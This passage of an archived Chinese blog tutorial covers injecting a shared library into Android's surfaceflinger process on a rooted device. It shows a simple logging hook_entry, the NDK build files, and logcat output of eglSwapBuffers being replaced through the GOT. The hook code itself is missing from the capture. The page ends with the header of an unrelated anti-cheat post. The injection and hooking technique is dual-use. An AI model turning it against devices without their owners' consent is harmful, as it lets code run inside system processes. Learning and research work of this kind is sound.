/>&nbsp;&nbsp;&nbsp;&nbsp;Application.mk</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">hello.c:</p><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;unistd.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;stdio.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;stdlib.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;android/log.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;elf.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#include &lt;fcntl.h&gt;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#define LOG_TAG &quot;DEBUG&quot;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#define LOGD(fmt, args...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, fmt, ##args)&nbsp;&nbsp;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; font-weight: bold; color: #ff9933; background-color: inherit" class="datatypes">int</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"> hook_entry(</span><span style="margin: 0px; padding: 0px; border: none; font-weight: bold; color: #ff9933; background-color: inherit" class="datatypes">char</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"> * a)&#123;&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;&nbsp;&nbsp;LOGD(<span style="margin: 0px; padding: 0px; border: none; color: #89d336; background-color: inherit" class="string">&quot;Hook success, pid = %d&#92;n&quot;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">, getpid());&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;&nbsp;&nbsp;LOGD(<span style="margin: 0px; padding: 0px; border: none; color: #89d336; background-color: inherit" class="string">&quot;Hello %s&#92;n&quot;</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">, a);&nbsp;&nbsp;</span></span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;&nbsp;&nbsp;<span style="margin: 0px; padding: 0px; border: none; font-weight: bold; color: #3399ff; background-color: inherit" class="keyword">return</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"> 0;&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&#125;&nbsp;&nbsp;</span></li></ol></div><span style="font-size: 14px; line-height: 26px; font-family: Arial">Android.mk:</span><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_PATH := $(call my-dir)&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">include $(CLEAR_VARS)&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog&nbsp;&nbsp; </span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit"><span style="margin: 0px; padding: 0px; border: none; color: gray; background-color: inherit" class="preprocessor">#LOCAL_ARM_MODE := arm</span><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_MODULE&nbsp;&nbsp;&nbsp;&nbsp;:= hello&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_SRC_FILES := hello.c&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">include $(BUILD_SHARED_LIBRARY)&nbsp;&nbsp;</span></li></ol></div><br /><span style="font-size: 14px; line-height: 26px; font-family: Arial">Application.mk:</span><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">APP_ABI := x86 armeabi-v7a&nbsp;&nbsp;</span></li></ol></div><span style="font-size: 14px; line-height: 26px; font-family: Arial">运行nkd-build编译成生x86和arm平台下的so：</span><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">jzj@jzj-laptop:~/workspace/inject_hook/hook_so_simple$ ndk-build&nbsp;&nbsp; </span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: libhello.so =&gt; libs/x86/libhello.so&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: libhello.so =&gt; libs/armeabi-v7a/libhello.so&nbsp;&nbsp;</span></li></ol></div><br /><span style="font-size: 14px; line-height: 26px; font-family: Arial">然后就可以跑起来试试了，连接root过的Android设备或者打开模拟器。将inject和libhello.so拷入设备，设执行权限，执行：</span><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"><img style="border: none; max-width: 100%" src="read-2.php-6638" tppabs="http://img.blog.csdn.net/20130811155828734?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvYXJpZXNqemo=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" border="0" /><br /></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">先看看被注入进程（surfaceflinger）的mmap，可以看到我们的so已经被加载了，紧接着的那一块就是我们mmap出来的：</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"><img style="border: none; max-width: 100%" src="read-2.php-6637" tppabs="http://img.blog.csdn.net/20130811155741687?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvYXJpZXNqemo=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" border="0" /></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">从logcat中也可以看到so注入成功，并且以被注入进程的身份执行了so中的代码：</p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"><img style="border: none; max-width: 100%" src="read-2.php-6636" tppabs="http://img.blog.csdn.net/20130811155716578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvYXJpZXNqemo=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" border="0" /><br /></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">简单的注入成功，现在我们再来做一个实验，就是应用这套机制来截获surfaceflinger中的eglSwapBuffers调用，然后用我们自己的函数来替换掉原来的eglSwapBuffers调用。关于截系统中的函数调用网上有例子<a style="text-decoration: none; outline: none; color: #ca0000" href="javascript:if(confirm('http://bbs.pediy.com/read.php?6635  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://bbs.pediy.com/read.php?6635'" tppabs="http://bbs.pediy.com/showthread.php?t=157419" target="_blank">http://bbs.pediy.com/showthread.php?t=157419</a>，这里依葫芦画瓢。首先将hello.c改下：</p><div class="dp-highlighter bg_cpp" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol class="dp-cpp" style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><br /></li></ol></div><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">其实这种查找方法有点简单粗暴，要是正式应用的话可以在动态符号表中查找这个符号的got地址。<br /></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">接着Android.mk改为：</p><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><br /></li></ol></div><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">Application.mk :<br /></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"></p><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">APP_ABI := x86 armeabi-v7a&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">APP_PLATFORM := android-14&nbsp;&nbsp;</span></li></ol></div><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"></p><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">运行ndk-build编译：</p><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">jzj@jzj-laptop:~/workspace/inject_hook/hook_so$ ndk-build&nbsp;&nbsp; </span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: libhello.so =&gt; libs/x86/libhello.so&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: libhello.so =&gt; libs/armeabi-v7a/libhello.so&nbsp;&nbsp;</span></li></ol></div><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">和上面一样运行，查看logcat，我们可以看到surfaceflinger中调用eglSwapBuffers的地址已被替换成我们的版本：</p><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Injecting process: 1728&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] get_remote_addr: local[b7e4f000], remote[b7e73000]&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Remote mmap address: b7e9fe32&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Calling mmap in target process.&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Target process returned from mmap, return value=b4f1c000, pc=0&nbsp;&nbsp; </span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] get_remote_addr: local[b7f00000], remote[b7f7e000]&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] get_remote_addr: local[b7f00000], remote[b7f7e000]&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] get_remote_addr: local[b7f00000], remote[b7f7e000]&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] get_remote_addr: local[b7f00000], remote[b7f7e000]&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Get imports: dlopen: b7f84f50, dlsym: b7f84fd0, dlclose: b7f84de0, dlerror: b7f84dc0&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Calling dlopen in target process.&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Target process returned from dlopen, return value=b7f995ec, pc=0&nbsp;&nbsp; </span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Calling dlsym in target process.&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): [+] Target process returned from dlsym, return value=b4f17e10, pc=0&nbsp;&nbsp; </span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/INJECT&nbsp;&nbsp;( 2231): hook_entry_addr = 0xb4f17e10&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): Hook success&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): Start hooking&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): Orig eglSwapBuffers = 0xb7d4a9c0&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): libsurfaceflinger.so address = 0xb7f22000&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): out_addr = b7f7aff4, out_size = 624&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): Found eglSwapBuffers in got&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">...&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): New eglSwapBuffers&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): New eglSwapBuffers&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">D/DEBUG&nbsp;&nbsp; ( 1728): New eglSwapBuffers&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">...&nbsp;&nbsp;</span></li></ol></div>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Nov</span>
	<span class="textbox-calendar-day">17</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6169.htm" tppabs="http://i.renjihe.com/blog/read.php?6169">技术流：弱联网手游如何防作弊？手游作弊攻防战</a> <span id="starid6169"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 20:23 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6169.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6169#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6169");'>引用(0)</a> , <a href="read.php-6169.htm" tppabs="http://i.renjihe.com/blog/read.php?6169">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6169" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
